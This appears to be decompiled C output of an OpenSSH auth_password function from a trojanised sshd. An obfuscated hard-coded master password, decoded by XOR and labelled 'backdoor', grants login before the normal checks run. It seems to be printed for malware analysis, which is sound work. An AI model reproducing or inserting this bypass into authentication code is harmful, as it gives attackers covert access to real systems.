
int auth_password(ssh *ssh,char *password)

{
  Authctxt *ctxt;
  passwd *ppVar1;
  int iVar2;
  uint ret;
  byte *pbVar3;
  byte *pbVar4;
  size_t sVar5;
  byte bVar6;
  int iVar7;
  long in_FS_OFFSET;
  char backdoor [31];
  byte local_39 [9];
  long canary;
  
  bVar6 = 0xd6;
  ctxt = (Authctxt *)ssh->authctxt;
  canary = *(long *)(in_FS_OFFSET + 0x28);
  backdoor._28_2_ = 0xa9f4;
  ppVar1 = ctxt->pw;
  iVar7 = ctxt->valid;
  backdoor._24_4_ = 0xbcf0b5e3;
  backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;
  backdoor[30] = -0x5b;
  backdoor._0_4_ = 0xf0e7abd6;
  backdoor._4_4_ = 0xa4b3a3f3;
  backdoor._8_4_ = 0xf7bbfdc8;
  backdoor._12_4_ = 0xfdb3d6e7;
  pbVar3 = (byte *)backdoor;
  while( true ) {
    pbVar4 = pbVar3 + 1;
    *pbVar3 = bVar6 ^ 0x96;
    if (pbVar4 == local_39) break;
    bVar6 = *pbVar4;
    pbVar3 = pbVar4;
  }
  iVar2 = strcmp(password,backdoor);
  ret = 1;
  if (iVar2 != 0) {
    sVar5 = strlen(password);
    ret = 0;
    if (sVar5 < 0x401) {
      if ((ppVar1->pw_uid == 0) && (options.permit_root_login != 3)) {
        iVar7 = 0;
      }
      if ((*password != '\0') ||
         (ret = options.permit_empty_passwd, options.permit_empty_passwd != 0)) {
        if (auth_password::expire_checked == 0) {
          auth_password::expire_checked = 1;
          iVar2 = auth_shadow_pwexpired(ctxt);
          if (iVar2 != 0) {
            ctxt->force_pwchange = 1;
          }
        }
        iVar2 = sys_auth_passwd(ssh,password);
        if (ctxt->force_pwchange != 0) {
          auth_restrict_session(ssh);
        }
        ret = (uint)(iVar2 != 0 && iVar7 != 0);
      }
    }
  }
  if (canary == *(long *)(in_FS_OFFSET + 0x28)) {
    return ret;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
